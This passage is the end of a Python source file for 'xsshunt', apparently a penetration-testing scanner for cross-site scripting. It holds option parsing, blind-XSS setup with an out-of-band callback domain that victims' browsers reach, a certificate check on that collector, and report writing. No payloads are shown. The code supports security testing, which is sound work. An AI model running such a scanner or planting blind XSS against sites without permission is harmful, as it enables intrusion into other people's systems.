                print(f"\n{quiet} hostname(s) encore silencieux - un blind XSS "
                      f"part souvent quand un admin ouvre la page, parfois des "
                      f"heures plus tard. Gardez ces noms sous surveillance :")
                print(f"  grep -iE '{BLIND_LABEL}("
                      + "|".join(sorted(t for t, m in scanner.blind_map.items()
                                        if not m.get("callback"))[:40])
                      + ")' <vos logs>")
    return by


def write_report(path: str, scanner: Scanner, req: Requester, urls, elapsed):
    report = {
        "tool": "xsshunt", "version": VERSION,
        "generated": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "targets": urls, "duration_sec": round(elapsed, 2),
        "requests": req.count,
        "skipped": scanner.skipped,
        # `plants` is browser-replay bookkeeping (14 entries per point), not a
        # result - it would drown the report without telling the reader anything.
        "findings": [{k: v for k, v in asdict(f).items()
                      if k not in ("plants", "submit")}
                     for f in scanner.findings],
        "blind_ids": scanner.blind_map,
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(report, fh, indent=2)
    print(f"report       : {path}")


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.no_color or os.environ.get("NO_COLOR"):
        Colors.disable()

    if not args.url and not args.list and not args.request:
        parser.print_help()
        return 2

    # -p used to mean --proxy here, as it did in the rest of the suite.
    # Silently treating a proxy URL as a point name would produce a scan that
    # looks normal and tests nothing that exists, so say it out loud instead.
    if args.param and re.match(r"^(?:https?|socks\d?)://", args.param.strip()):
        print(f"error: -p now names the injection point to test, not the "
              f"proxy — use -x {args.param} (or --proxy)", file=sys.stderr)
        return 2

    if args.blind:
        scheme, domain, port = blind_collector(args.blind)
        if not domain or "." not in domain:
            print(f"error: -b attend un domaine OOB (ex: meoob.cc), pas "
                  f"{args.blind!r}", file=sys.stderr)
            return 2
    elif args.dns_log or args.http_log:
        # A switch that looks active has to be active: with no -b nothing is
        # ever planted, so there is no token for the logs to contain.
        print("error: --dns-log/--http-log demandent -b (aucun token n'est "
              "planté sans lui)", file=sys.stderr)
        return 2

    if args.auth_file and args.auth_dir:
        print("error: --auth-file and --auth-dir are mutually exclusive",
              file=sys.stderr)
        return 2

    # -r prend le pas : cible unique décrite par un fichier de requête brute
    spec = None
    header_list = list(args.header)
    req_header_list = []
    if args.request:
        if not os.path.isfile(args.request):
            print(f"error: no such file: {args.request}", file=sys.stderr)
            return 2
        try:
            spec = parse_raw_request(args.request, force_ssl=args.force_ssl)
        except Exception as e:
            print(f"error: parsing de la requête impossible ({args.request}): {e}",
                  file=sys.stderr)
            return 2
        if args.url or args.list:
            print("note: -r est prioritaire ; -u/-l ignorés", file=sys.stderr)
        urls = [spec.url]
        # les en-têtes de la requête sont une source à part : l'auth file
        # s'intercale entre eux et -H
        req_header_list = [f"{k}: {v}" for k, v in spec.headers.items()]
    else:
        urls = collect_targets(args)
        if urls is None:
            return 2
        if not urls:
            print("error: no targets", file=sys.stderr)
            return 2

    if args.blind:
        _, domain, port = blind_collector(args.blind)
        schemes = sorted({blind_scheme(args.blind, u, args.force_ssl)
                          for u in urls})
        host = f"{BLIND_LABEL}<token>.{domain}{':' + port if port else ''}"
        print("note: les callbacks arriveront sur "
              + (f"{schemes[0]}://{host}" if len(schemes) == 1 else
                 f"{host}, schéma calqué sur chaque cible "
                 f"({' / '.join(schemes)})"), file=sys.stderr)
        if "https" in schemes:
            # Purely advisory, and deliberately off the critical path: this
            # probe reaches out to the collector, which may be slow, firewalled
            # or a black hole. Measured at 6s of dead time when it hangs. It
            # runs on a daemon thread so it can never delay a scan, never
            # shorten one, and never decide whether a test runs - the warning
            # simply turns up a moment later if it applies. It is skipped
            # entirely when no target resolves to https, since the certificate
            # then never comes into play.
            def _cert_probe():
                try:
                    bad = blind_cert_ok(
                        domain, int(port) if port.isdigit() else 443) is False
                except Exception:
                    return
                if not bad:
                    return
                try:
                    print(f"attention: le certificat de {BLIND_LABEL}*.{domain}"
                          f" n'est pas valide. Le navigateur d'une victime "
                          f"refusera le callback APRÈS avoir résolu le nom : "
                          f"votre log DNS se remplira, votre log HTTP restera "
                          f"vide. Corrigez le certificat wildcard, ou forcez "
                          f"-b http://{domain} si la cible le permet. (Les "
                          f"tests se poursuivent normalement.)",
                          file=sys.stderr)
                except Exception:
                    pass    # the run may already be shutting down

            threading.Thread(target=_cert_probe, daemon=True).start()

    rep = Reporter(args.verbose)
    # heartbeat only in list mode (-l); a single target needs no queue accounting
    status = Status(rep, len(urls), interval=args.status_interval,
                    enabled=bool(args.list))
    if args.verbose >= 1:
        rep.info(f"xsshunt {VERSION} - {len(urls)} target(s), "
                 f"{args.threads} thread(s)")
        if spec is not None:
            if spec.parts:
                body_desc = "multipart, %d part(s): %s" % (
                    len(spec.parts),
                    [p.name + ("*" if p.is_file else "") for p in spec.parts])
            elif spec.json_body is not None:
                leaves = [p for p, _, _ in json_leaves(spec.json_body)]
                body_desc = f"JSON, {len(leaves)} leaf/leaves: {leaves}"
            else:
                body_desc = f"{list(spec.body_params) or '-'}"
            rep.info(f"raw request: {spec.method} {spec.url} | "
                     f"query={spec.query_params or '-'} | "
                     f"body={body_desc}")
        rep.info("blind XSS: " + (args.blind or "disabled (no -b supplied)"))

    try:
        auth = AuthStore.load(args.auth_file, args.auth_dir, rep)
    except ValueError as e:
        print(f"error: {e}", file=sys.stderr)
        return 2
    auth.describe(rep)

    req = Requester(timeout=args.timeout, proxy=args.proxy, headers=header_list,
                    req_headers=req_header_list, auth=auth,
                    delay=args.delay, reporter=rep)
    confirmer = Confirmer(args, rep, resolver=req.replay_headers_for)
    confirmer.start()
    scanner = Scanner(req, rep, args, status, confirmer=confirmer)
    watcher = LogWatcher(args, rep, scanner)

    started = time.time()
    status.start()
    watcher.start()
    try:
        if spec is not None:
            try:
                scanner.scan_request(spec)
            except Exception as e:
                rep.error(f"{spec.url}: {e}")
            finally:
                status.host_done()
        else:
            run_scans(scanner, urls, rep, args, status)
    except KeyboardInterrupt:
        rep.error("interrupted by user")
    finally:
        status.stop()
        status.emit(label="final")
        confirmer.stop()
        watcher.stop()
    # After the browser is down: a callback can lag the request that caused it.
    watcher.final()
    elapsed = time.time() - started

    by = print_summary(scanner, req, urls, elapsed, args)
    if args.output:
        write_report(args.output, scanner, req, urls, elapsed)

    return 1 if (by["confirmed"] or by["oob"] or by["alert"]) else 0


if __name__ == "__main__":
    sys.exit(main())
